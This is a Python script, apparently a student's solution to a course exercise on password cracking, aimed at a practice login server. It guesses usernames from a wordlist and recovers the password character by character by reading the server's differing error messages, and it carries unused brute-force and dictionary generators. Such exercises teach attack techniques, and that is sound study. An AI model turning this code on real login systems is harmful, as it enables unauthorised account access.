# write your code here
import argparse
import socket
import itertools
import os
import json
import string

SYMBOLS = string.ascii_letters + string.digits


def get_address_from_args():
    """
    :return: tuple of an IP address (str) and port (int)
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address', type=str)
    parser.add_argument('port', type=int)

    args = parser.parse_args()
    ip_address = args.ip_address
    port = int(args.port)
    return ip_address, int(port)


def send_request(sock, a_message):
    """
    The function encodes and sends the given message
    to the server via connected socket

    :param sock: connected socket
    :param a_message:
    :return: None
    """
    encoded_message = a_message.encode()
    sock.send(encoded_message)


def parse_login(a_login: str, a_password: str):
    """
    :param a_login: login name
    :param a_password: password
    :return: JSON format - {"login": a_login, "password": a_password}
    """
    return json.dumps({"login": a_login, "password": a_password})


def brute_force_pass_gen():
    """
    The generator yields all possible combinations of all ASCII letters and digits
    starting with the length 1

    :return: None
    """
    pass_length = 1
    while pass_length > 0:
        for password in itertools.product(SYMBOLS, repeat=pass_length):
            yield ''.join(password)
        pass_length += 1


def typical_pass_gen(passwords: list):
    """
    The generator yields each password from the given list of typical passwords
    in all possible combinations of letter cases

    :param passwords: list of typical passwords
    :return: None
    """
    for word in passwords:
        different_case_list = [x if x.isdigit() else (x.lower(), x.upper()) for x in word]

        for password in itertools.product(*different_case_list):
            yield ''.join(password)


def typical_login_gen(logins: list):
    """
    The generator yields each login name from the given list of typical logins

    :param logins: list of typical logins
    :return: None
    """
    for login in logins:
        yield login


def find_login(sock, login_generator):
    """
    The function looks for the correct login name by sending
    typical login names with an empty password field.
    If response from the server is "Wrong password!"
    then the correct password is found.

    :param sock: connected socket
    :param login_generator: generator of typical login names
    :return: correct login
    """
    while True:
        login = next(login_generator)
        parsed_login_info = parse_login(login, " ")
        send_request(sock, parsed_login_info)
        respond = json.loads(sock.recv(1024).decode())
        if respond["result"] == "Wrong password!":
            return login


def find_password(sock, login: str):
    """
    The function looks for the correct password.
    If the sent sequence of symbols matches the beginning
    of the correct password then the server responds
    "Exception happened during login". The function
    goes through all symbols for each position trying
    to get the correct match until the server response is
    "Connection success!"

    :param sock: connected socket
    :param login: correct login name
    :return: correct password
    """
    current_password = ""
    while True:
        for sym in SYMBOLS:
            password = current_password + sym
            parsed_login_info = parse_login(login, password)
            send_request(sock, parsed_login_info)
            respond = json.loads(sock.recv(1024).decode())
            if respond["result"] == "Exception happened during login":
                current_password += sym
                break
            if respond["result"] == "Connection success!":
                return password


if __name__ == "__main__":
    stage = 4
    typical_logins_list = open(os.path.realpath('logins.txt')).read().splitlines()
    # typical_passwords_list = open(os.path.realpath('passwords.txt')).read().splitlines()

    address = get_address_from_args()
    with socket.socket() as s:
        s.connect(address)
        login_gen = typical_login_gen(typical_logins_list)
        correct_login = find_login(s, login_gen)
        correct_password = find_password(s, correct_login)
        print(parse_login(correct_login, correct_password))

